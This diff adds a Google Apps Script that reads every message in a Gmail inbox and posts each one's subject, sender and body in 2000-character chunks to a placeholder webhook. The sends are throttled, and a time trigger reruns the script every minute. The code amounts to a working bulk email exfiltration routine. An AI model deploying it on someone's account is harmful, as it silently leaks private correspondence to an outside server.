@@ -1,0 +1,73 @@
+function sendEmailsToWebhook() {
+  var webhookUrl = "Your_WebHook";
+  
+  var threads = GmailApp.getInboxThreads();
+  
+  for (var i = 0; i < threads.length; i++) {
+    var thread = threads[i];
+    var messages = thread.getMessages();
+    
+    for (var j = 0; j < messages.length; j++) {
+      var message = messages[j];
+      var emailContent = getEmailContent(message);
+      
+      var chunks = splitIntoChunks(emailContent, 2000);
+      
+      for (var k = 0; k < chunks.length; k++) {
+        var chunk = chunks[k];
+        sendToWebhook(webhookUrl, chunk);
+        Utilities.sleep(300000);
+      }
+    }
+  }
+}
+
+function getEmailContent(message) {
+  var subject = message.getSubject();
+  var sender = message.getFrom();
+  var body = message.getPlainBody();
+  
+  var emailContent = "Subject: " + subject + "\n";
+  emailContent += "From: " + sender + "\n\n";
+  emailContent += body;
+  
+  return emailContent;
+}
+
+function splitIntoChunks(content, maxLength) {
+  var chunks = [];
+  while (content.length > maxLength) {
+    chunks.push(content.substring(0, maxLength));
+    content = content.substring(maxLength);
+  }
+  chunks.push(content);
+  return chunks;
+}
+
+function sendToWebhook(webhookUrl, message) {
+  var payload = {
+    content: message
+  };
+  
+  var options = {
+    method: "POST",
+    contentType: "application/json",
+    payload: JSON.stringify(payload)
+  };
+  
+  UrlFetchApp.fetch(webhookUrl, options);
+}
+
+function createTrigger() {
+  var triggers = ScriptApp.getProjectTriggers();
+  for (var i = 0; i < triggers.length; i++) {
+    if (triggers[i].getHandlerFunction() == "sendEmailsToWebhook") {
+      ScriptApp.deleteTrigger(triggers[i]);
+    }
+  }
+  
+  ScriptApp.newTrigger("sendEmailsToWebhook")
+    .timeBased()
+    .everyMinutes(1)
+    .create();
+}
